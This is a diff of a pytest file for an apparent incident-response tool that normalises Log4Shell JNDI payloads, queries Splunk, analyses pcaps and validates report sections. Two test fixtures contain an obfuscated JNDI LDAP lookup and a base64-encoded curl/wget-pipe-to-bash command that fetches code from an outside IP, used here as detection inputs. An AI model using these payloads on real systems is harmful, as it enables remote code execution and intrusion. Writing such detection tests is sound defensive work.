@@ -1,26 +1,25 @@
 import json
-import requests
+from unittest.mock import MagicMock, patch
+
 import pytest
+import requests
 import responses
-from unittest.mock import patch, MagicMock
 
 import multi_agent as ma
 from multi_agent import (
     CONFIG,
+    PipelineTelemetry,
+    _parse_tshark_field_output,
+    enrich_iocs,
     load_section,
     normalize_jndi_payload,
-    tool_query_splunk,
-    _parse_tshark_field_output,
-    tool_analyze_pcap,
-    telemetry,
-    PipelineTelemetry,
     retry_request,
-    enrich_iocs,
     summarize_vuln_scan,
-    tool_syft_sbom,
+    tool_analyze_pcap,
     tool_grype_scan,
+    tool_query_splunk,
+    tool_syft_sbom,
 )
-
 
 # ----- load_section -----
 
@@ -67,13 +66,20 @@ def test_normalize_nested_obfuscation():
 
 
 def test_normalize_real_base64_payload():
-    payload = "KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xOTguNzEuMjQ3LjkxOjgwfHx3Z2V0IC1xIC1PLSAxOTUuNTQuMTYwLjE0OTo1ODc0LzE5OC43MS4yNDcuOTE6ODApfGJhc2g="
+    payload = (
+        "KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xOTguNzEuMjQ3LjkxOjgwfHx3"
+        "Z2V0IC1xIC1PLSAxOTUuNTQuMTYwLjE0OTo1ODc0LzE5OC43MS4yNDcuOTE6ODApfGJhc2g="
+    )
     result = normalize_jndi_payload(payload)
     assert result == payload
 
 
 def test_normalize_pdf_jndi_with_obfuscation():
-    payload = "${${lower:j}ndi:${lower:l}dap://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xOTguNzEuMjQ3LjkxOjgwfHx3Z2V0IC1xIC1PLSAxOTUuNTQuMTYwLjE0OTo1ODc0LzE5OC43MS4yNDcuOTE6ODApfGJhc2g=}"
+    payload = (
+        "${${lower:j}ndi:${lower:l}dap://195.54.160.149:12344/Basic/Command/Base64/"
+        "KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xOTguNzEuMjQ3LjkxOjgwfHx3"
+        "Z2V0IC1xIC1PLSAxOTUuNTQuMTYwLjE0OTo1ODc0LzE5OC43MS4yNDcuOTE6ODApfGJhc2g=}"
+    )
     result = normalize_jndi_payload(payload)
     assert "jndi:ldap://195.54.160.149" in result
     assert "${lower:" not in result
@@ -149,7 +155,8 @@ def test_tool_query_splunk_empty():
 
 @responses.activate
 def test_tool_query_splunk_with_pdf_fixture():
-    import json, os
+    import json
+    import os
     fixture_path = os.path.join(os.path.dirname(__file__), "fixtures", "pdf_splunk_results.json")
     with open(fixture_path) as f:
         pdf_data = json.load(f)
@@ -167,7 +174,8 @@ def test_tool_query_splunk_with_pdf_fixture():
 
 @responses.activate
 def test_tool_query_splunk_pdf_full_timeline():
-    import json, os
+    import json
+    import os
     fixture_path = os.path.join(os.path.dirname(__file__), "fixtures", "pdf_splunk_results.json")
     with open(fixture_path) as f:
         pdf_data = json.load(f)
@@ -626,6 +634,39 @@ def test_synthetic_pcap_suspicious_ua(mock_run):
     with patch("os.path.exists", return_value=True):
         result = tool_analyze_pcap("test.pcap")
     assert "Suspicious UA" in result or "curl" in result
+
+
+# ----- Report validation tests -----
+
+def test_validate_report_all_sections_present():
+    report = """### §1 — Timeline
+### §2 — Affected Systems
+### §3 — Exploitation Detection — Log Analysis
+### §4 — Exploitation Detection — Network Analysis
+### §5 — Exploitation Detection — Endpoint Analysis
+### §6 — IP Categorization
+### §7 — Preventative Recommendations
+### §8 — Additional Resources"""
+    missing = ma.validate_report_structure(report)
+    assert missing == []
+
+
+def test_validate_report_section_missing():
+    report = "### §1 — Timeline\n### §3 — Log Analysis"
+    missing = ma.validate_report_structure(report)
+    assert "§2 — Affected Systems" in missing
+    assert "§4 — Exploitation Detection — Network Analysis" in missing
+
+
+def test_validate_report_empty():
+    missing = ma.validate_report_structure("")
+    assert len(missing) == 8
+
+
+def test_validate_report_partial_section_numbers():
+    report = "§1\n§2\n§3\n§4\n§5\n§6\n§7\n§8"
+    missing = ma.validate_report_structure(report)
+    assert missing == []
 
 
 # ----- retry_request -----
